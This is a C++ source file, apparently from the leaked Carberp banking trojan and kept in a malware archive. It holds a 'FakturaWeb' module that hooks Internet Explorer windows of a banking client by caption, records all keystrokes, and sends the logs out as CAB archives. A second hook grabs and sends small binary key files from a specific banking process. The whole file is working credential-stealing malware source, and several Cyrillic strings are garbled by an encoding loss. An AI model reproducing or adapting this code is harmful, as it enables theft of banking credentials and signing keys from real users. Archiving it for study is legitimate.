/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "KeyLogSystems.h"
#include "FileGrabber.h"

#include "BotDebug.h"

namespace DBGFAKTURAWEB
{
	#include "DbgTemplates.h"
}

#define DBGFAKTURA DBGFAKTURAWEB::DBGOutMessage<>

#define FakturaWebModule //������� ��� ������ �������

#define PROCESS_HASH_OSL2SKS 0xD9BCA8C3

namespace FakturaWeb
{
	PKeyLogSystem System = 0;

	//true - ���� ���� �������� ������ ������, � ����� �������� ��� � �������
	int IsFileKey( FileGrabber::ParamEvent* e )
	{
		if( e->data )
		{
			return FileGrabber::SENDFILE | FileGrabber::CURRNAMEFILE;
		}
		return 0;
	}

	void Activeted(LPVOID Sender)
	{
		DBGFAKTURA( "Faktura", "Activated" );
		System = (PKeyLogSystem)Sender;
	}

	void Activeted2(LPVOID Sender)
	{
		if( System )
		{
			DBGFAKTURA( "Faktura", "Activeted OSL2SKS" );
			FileGrabber::Init(FileGrabber::CREATEFILEA);
			FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
			rv->FuncReceiver = IsFileKey;
			rv->minSize = 2000;
			rv->maxSize = 5000;
			rv->aw |= FileGrabber::FILEISBIN;
			FileGrabber::AddReceiver(rv);
		}
	}

	void Deactiveted(LPVOID Sender)
	{
		DBGFAKTURA( "Faktura", "Deactiveted" );
		System = 0;
		FileGrabber::Release();
	}

	void Init()
	{
		PKeyLogSystem S = KeyLogger::AddSystem("faktura", PROCESS_HASH_IE);
		if( S != NULL )
		{
			char FacturaCaption[] = {
				'�', '�', '�', '�', '�', '�', '�', '�', ' ', '�', '�', '�', '�', '�',
				'�', ' ', '(', '�', '�', '�', '�', ' ', 'R', 'S', 'A', ')', 0 };

//			char FacturaCaption[] = {'�','�','�','�','�','�','�','�',' ','�','�','�','�',' ','�','�','�','�','�','�','�','�','�','�','�','�',' ','(','�','�','�','�','�','�','�','�','�',' ','R','S','A',')', 0};


			S->SendLogAsCAB = true;
			S->OnActivate = Activeted;
			S->OnDeactivate = Deactiveted;
		
			KeyLogger::AddFilter(S, true, true, NULL, FacturaCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
		}
		
		S = KeyLogger::AddSystem("faktura", PROCESS_HASH_OSL2SKS);
		if( S != NULL )
		{
			S->SendLogAsCAB = true;
			S->OnProcessRun = Activeted2;
		}
	}
}
